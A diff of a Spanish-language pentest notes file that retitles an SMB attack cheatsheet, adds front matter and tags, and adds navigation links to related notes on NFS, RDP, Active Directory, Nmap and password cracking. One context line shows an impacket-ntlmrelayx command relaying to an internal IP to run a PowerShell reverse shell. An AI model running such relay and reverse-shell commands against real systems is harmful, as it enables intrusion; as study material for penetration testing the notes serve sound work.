@@ -1,5 +1,10 @@
-
 ---
+tipo: cheatsheet
+tags: [smb, impacket, crackmapexec, smbclient, smbmap, pass-the-hash, ntlm-relay, hosts]
+actualizado: 2026-05-28
+---
+
+# SMB — Cheatsheet de Ataques
 
 #SMB #AttackingSMB #PenTest #Cybersecurity #smbclient #smbmap #rpcclient #enum4linux #CrackMapExec #Impacket #NullSession #PassTheHash #NTLMRelayAttack #RedTeam #HackingTools
 
@@ -26,8 +31,24 @@
 | `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>` | Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`. |
 
 
-**[[SQL]]**
-[[1- Instalar Base de datos MySQL]]
-[[2- Insertar Información a la Base de Datos desde Python]]
-[[3- Consultas a la Base de Datos]]
-[[4- Consultar a la Base de Datos + Sentencias Condicionales]]
+---
+
+## Navegación
+
+- ⬆️ Carpeta: [[index|3- hosts]]
+- ⬅️ Anterior: [[8- RDP]]
+- ➡️ Siguiente: [[10- SNMP]]
+
+## Relacionadas (file sharing y Windows)
+
+- [[6- NFS]] — equivalente en Linux/Unix.
+- [[12- Windows Hosts]] — RDP/WinRM/WMI complementarios para admin remoto Windows.
+- [[../../../01-Sistemas-Operativos/Windows/7- Activie Directory/index|01 → Active Directory]] — SMB es protocolo central en AD.
+- [[../../../01-Sistemas-Operativos/Windows/7- Activie Directory/2- Tools|AD → Tools]] — herramientas adicionales.
+
+## Relacionadas (Nmap y cracking)
+
+- [[1- Hoja de trucos NMAP]] — categoría NSE `smb-*`.
+- [[5- nmap scripts]] — scripts SMB específicos.
+- [[12- Herramienta para hacer cracking de contraseñas]] — hashes NTLM extraídos de SAM van a Hashcat.
+- [[../../1- Cracking/1- Cracking|02 → Cracking]] — teoría general de cracking.
